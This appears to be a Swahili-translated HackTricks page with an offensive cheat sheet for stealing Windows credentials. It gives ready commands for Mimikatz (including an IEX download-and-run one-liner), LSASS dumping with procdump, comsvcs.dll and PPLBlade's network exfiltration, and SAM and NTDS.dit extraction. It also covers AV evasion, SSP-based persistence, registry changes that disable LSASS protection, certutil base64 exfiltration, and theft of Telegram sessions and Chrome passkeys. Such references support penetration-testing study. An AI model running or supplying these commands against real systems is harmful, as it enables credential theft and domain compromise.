# Kuiba Taarifa za Kuingia za Windows

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Kuingia za Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials kwa Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyounda ili** kutafuta **nywila na hashes** ndani ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Kukwepa AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, Defender haigundui.\
Unaweza kutumia zana hii **kutengeneza dump ya mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials kwenye kompyuta ya ndani** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ku-dump lsass.exe** kuwa **ya nia ovu**, kwa sababu zinatambua string **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **stealthier** kupitisha **PID** ya lsass.exe kwa procdump kama **argument** badala ya **jina lsass.exe.**

### Dumping lsass with **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inahusika na **ku-dump memory ya process** inapotokea crash. DLL hii ina **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Haijalishi kutumia argument mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Process ID ya process itakayo-dump ndiyo kipengele cha kwanza, mahali pa faili ya dump ni cha pili, na kipengele cha tatu lazima kiwe neno **full** pekee. Hakuna chaguo jingine.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda faili ya dump na kuhamisha memory ya process iliyobainishwa ndani ya faili hiyo.\
Inawezekana kutumia **comsvcs.dll** ku-dump process ya lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Mbinu hii imeelezwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kutekeleza:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Unaweza kuautomate mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta process ya "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye process ya "Local Security Authority Process" kisha ubofye "Create dump file".

### Kudump lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft na ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump iliyopo tayari ya mfumo mzima, au nakala iliyobanwa kwenye folda ya mtumiaji inayoweza kufikiwa, inaweza kuhifadhi data za credentials kwa uchanganuzi wa offline. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni vidokezo vya kuanza ukaguzi tu: thibitisha chanzo na uwezo wa kuzifikia, na usidhani zina credentials zinazoweza kutumika au za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpin lsass kwa PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni zana ya kutupa Protected Process inayounga mkono kuficha memory dump na kuihamisha kwenye workstations za mbali bila kuihifadhi kwenye diski.

**Utendaji mkuu**:

1. Kukwepa ulinzi wa PPL
2. Kuficha faili za memory dump ili kukwepa mbinu za Defender za kugundua kwa kutumia signature
3. Kupakia memory dump kwa kutumia mbinu za RAW na SMB bila kuihifadhi kwenye diski (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – dumping ya LSASS inayotumia SSP bila MiniDumpWriteDump

Ink Dragon hutumia dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, kwa hivyo EDR hooks za API hiyo hazitokei:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta `fdp.dll` kwa placeholder yenye herufi ndogo `d` 32, huiandika upya kwa absolute path ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, kisha hupanga blob iliyodecodeiwa kwenye memory kabla ya kukabidhi utekelezaji.
3. **Stage 3 dumper** – payload iliyopangwa upya hutekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zinazotatuliwa kupitia majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump ya LSASS iliyobanwa kwenye faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo kwa operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 huandika upya placeholder iliyowekwa ndani ya faili kwa absolute path ya `rtu.txt`, kwa hivyo kuvitenganisha huvunja mnyororo.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ipakie upya SSP kila boot.
* Faili za `%TEMP%\*.ddt` ni dumps zilizobanwa. Zibandue kwenye kompyuta ya ndani, kisha uzitumie na Mimikatz/Volatility ili kutoa credentials.
* Kuendesha `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; baada ya call hiyo kurudi, LSASS hupakia SSP hasidi kimyakimya na kutekeleza Stage 2.
* Kuondoa DLL kwenye disk hakuiondoi kutoka LSASS. Futa ingizo la registry na uwashe upya LSASS (reboot), au uiache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit kutoka kwenye DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka kwa DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Stealing SAM & SYSTEM

Faili hizi zinapaswa kuwa **katika** _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **utoe hashes** kwa kutumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Kutumia vssadmin

Binary ya vssadmin inapatikana tu kwenye matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na faili linahifadhiwa kwenye C:\users\Public), lakini unaweza kutumia njia hii kunakili faili lolote lililolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala ya SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama moyo wa **Active Directory**, ikiwa na data muhimu kuhusu objects za watumiaji, groups na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hii ni database ya **Extensible Storage Engine (ESE)** na iko kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Database hii ina majedwali matatu ya msingi:

- **Data Table**: Jedwali hili huhifadhi maelezo kuhusu objects kama watumiaji na groups.
- **Link Table**: Hufuatilia mahusiano, kama vile uanachama wa groups.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, ili kuhakikisha usalama na udhibiti wa ufikiaji wa objects zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu safu ya database unaeleza majedwali haya na tabia zake kulingana na matoleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hiyo, na _lsass.exe_ huitumia. Kwa hiyo, **sehemu** ya faili ya **NTDS.dit** inaweza kuwa **ndani ya kumbukumbu ya `lsass`** (huenda unaweza kupata data iliyofikiwa hivi karibuni kwa sababu ya uboreshaji wa utendaji unaotumia **cache**).

#### Kufungua hash zilizomo ndani ya NTDS.dit

Hash husimbwa mara tatu:

1. Fungua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Fungua **hash** kwa kutumia **PEK** na **RC4**.
3. Fungua **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **husimbwa** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller hiyo. Kwa hiyo, ili kupata credentials, unahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Imepatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili la **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, tumia mbinu ya [**kuidump kutoka kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa objects za domain kutoka NTDS.dit hadi kwenye database ya SQLite**

Objects za NTDS zinaweza kutolewa na kuwekwa kwenye database ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio secrets pekee zinazotolewa, bali pia objects zote pamoja na attributes zake, ili kupata maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` ni ya hiari, lakini inaruhusu kusimbua secrets (hashes za NT na LM, credentials za ziada kama vile nywila za maandishi wazi, funguo za kerberos au trust, na historia za nywila za NT na LM). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zake, flags za UAC, timestamp ya logon ya mwisho na mabadiliko ya mwisho ya nywila, maelezo ya akaunti, majina, UPN, SPN, groups na memberships za kujirudia, mti wa organizational units na membership zake, domains zinazoaminiana pamoja na aina, mwelekeo na attributes za trust...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa credentials kutoka kwenye software mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Toa taarifa za uthibitishaji kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na *execute it* tu, kisha passwords zitatolewa.

## Kukusanya taarifa kutoka kwenye sessions za RDP zisizotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon ina tasker ya `DumpRDPHistory` ambayo mbinu zake zinafaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP yanayotoka nje** – changanua kila hive ya mtumiaji kwenye `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la seva, `UsernameHint`, na muhuri wa muda wa mabadiliko ya mwisho. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – chunguza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (kuingia kwa mafanikio) na **25** (kukata muunganisho) ili kubaini nani aliyesimamia mashine:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Ukishajua ni Domain Admin gani huunganisha mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yao ya **disconnected** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zao ndani ya LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Kushushwa kwa kiwango cha Registry kunakolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha funguo kadhaa za Registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Kuweka `DisableRestrictedAdmin=1` hulazimisha utumiaji upya kamili wa credential/ticket wakati wa RDP, na kuwezesha pivots za mtindo wa pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili admins wa ndani wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` huruhusu administrator wa DSRM kuingia wakati DC iko mtandaoni, na kuwapa washambuliaji akaunti nyingine ya ndani yenye mapendeleo ya juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi sana kwa zana za kutoa dump kama LalsDumper.

## Credential za usanidi wa hMailServer (post-compromise)

Kagua faili halisi za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani ya `[Security] AdministratorPassword=` inayosomeka na isiyo tupu ni hash ya nenosiri la usimamizi wa hMailServer; si ushahidi wa nenosiri la Windows Administrator. Ikiwa credential hiyo itapatikana, pivot yoyote kwenda kwenye akaunti ya Windows inahitaji kuthibitisha matumizi upya ya nenosiri na haki za kuingia kando.

Kwa usakinishaji unaotumia database ya SQL CE, thamani tofauti ya `[Database] Password=` kwenye INI hulinda database. Katika usakinishaji wa zamani, thamani hii imesimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na ubadilishaji wa mpangilio wa endianness wa maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI kwa snippet hii ya Python:<sup>[[2]](#references)</sup>

Kwanza thibitisha kwamba akaunti ya sasa inaweza kusoma **zote mbili**: INI na database husika ya SQL CE `.sdf`. Nenosiri la INI hulinda database; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya database inayotumika; usiwahi kutumia faili ya moja kwa moja.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Ukitumia nenosiri la maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya biti 32, na uboreshe ikiwa inahitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu wima ya `accountpassword` hutumia umbizo la hash la hMailServer (hashcat mode `1421`). Nenosiri la mailbox lililovunjwa huwa pivot ya mtumiaji wa Windows tu ikiwa nenosiri hilo linatumiwa tena na akaunti ya ndani/domain na akaunti hiyo ina haki zinazohitajika za kuingia kwa mbali.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya zana hukamata **nywila za kuingia zilizo wazi (plaintext)** kwa kunasa callback ya kuingia ya LSA `LsaApLogonUserEx2`. Wazo ni kuhook au kufunika callback ya kifurushi cha uthibitishaji ili kunasa credentials **wakati wa kuingia** (kabla ya hashing), kisha kuziandika kwenye diski au kumrudishia operator. Hii kwa kawaida hutekelezwa kama helper inayoingiza msimbo ndani ya LSA au kujisajili nayo, kisha kurekodi kila tukio la kuingia kwa mafanikio—la ndani ya mashine au la mtandao—pamoja na jina la mtumiaji, domain na nenosiri.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye njia ya uthibitishaji.
- Credentials zilizokamatwa huonekana tu kuingia kunapotokea (kuingia kwa ndani ya mashine, RDP, service au mtandao, kutegemea hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi taarifa za muunganisho zilizohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Dumpers maalum zinaweza kuchanganua faili na kurejesha credentials za SQL zilizohifadhiwa. Kwenye shells zinazorejesha matokeo ya amri pekee, faili mara nyingi hutolewa nje kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, jenga upya faili na uendeshe dumper ndani ya mashine yako ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session ya Telegram Desktop `tdata`

Telegram Desktop huhifadhi hali ya uidhinishaji na akaunti katika saraka yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa zana zinazooana ili kuthibitisha akaunti bila nenosiri, maadamu uidhinishaji huo bado ni halali; ikiwa usimbaji fiche wa data ya ndani umewashwa, mwizi pia huhitaji passcode yake. Session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe, na media inayoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Ugunduzi na upatikanaji

Tafuta kwenye mipangilio iliyosakinishwa na inayobebeka; majina ya vifurushi vya Microsoft Store hutofautiana, kwa hiyo orodhesha saraka za vifurushi zilizo na `TelegramMessenge` na uchunguze mti wake mdogo wa `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ikiwa usomaji wa kawaida utashindwa na tokeni ya mchakato **tayari ina** `SeBackupPrivilege` **na imeiwezesha**, ufikiaji unaozingatia backup hutoa njia mbadala; haupati privilege hiyo wala kuongeza mamlaka ya mchakato. `CreateFileW` yenye `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantiki za backup/restore na kupita ukaguzi wa usalama wa faili ikiwa tokeni ina privileges zinazohitajika, lakini flag pekee haiwezi kupita kizuizi cha kushiriki faili kisichoendana.<sup>[[10]](#references)[[11]](#references)</sup>

Kwa faili zilizofungwa zilizo hai, tengeneza/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia hali ya backup na kupita ACL za faili na saraka.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant inayozingatia matumizi ya bandwidth inaweza kutuma kwanza orodha ya njia za faili pekee, kupokea kitambulisho cha snapshot pamoja na njia ambazo tayari zimehifadhiwa na C2, kisha kupakia faili zinazokosekana pekee. Kwa hivyo, uhamishaji mdogo wa hatua kwa hatua baada ya kuorodhesha `tdata` kwa kujirudia bado unaweza kuashiria wizi wa session uliofanikiwa.<sup>[[10]](#references)</sup>

### Ugunduzi na udhibiti wa tishio

Linganisha ufikiaji wa kujirudia kwa `tdata` na mchakato usio wa Telegram pamoja na kuwezeshwa kwa `SeBackupPrivilege`, kufunguliwa kwa faili kwa kutumia backup semantics, shughuli za VSS, au child process ya `robocopy.exe` inayotumia `/B`. Pia tafuta uorodheshaji wa haraka wa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, ukifuatiwa na miunganisho ya nje kutoka kwa mchakato huo huo. Baada ya kuathirika, tumia **Settings → Devices** (au **Privacy & Security → Active Sessions**) kusitisha session zisizotambulika; kuwezesha two-step verification pekee hakubatilishi authorization ambayo tayari imeibwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa passkeys / credentials za WebAuthn kutoka Chrome kwenye Windows

Ikiwa utekelezaji wa code utapatikana kama **mtumiaji aliyeathiriwa** kwenye host ya Windows inayotumia **Chrome + passkeys zilizosawazishwa na Google Password Manager**, passkeys huwa lengo la kuvutia baada ya exploitation, hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artifacts za ndani zinazovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizosimbwa kwa protobuf. Mchakato wa mtumiaji yuleyule unaweza kuorodhesha **RP ID**, **jina la mtumiaji**, **ID ya credential**, na nyenzo za private key zilizosimbwa kwa passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya ndani ya uandikishaji wa kifaa, kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumiwa kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Triage ya haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

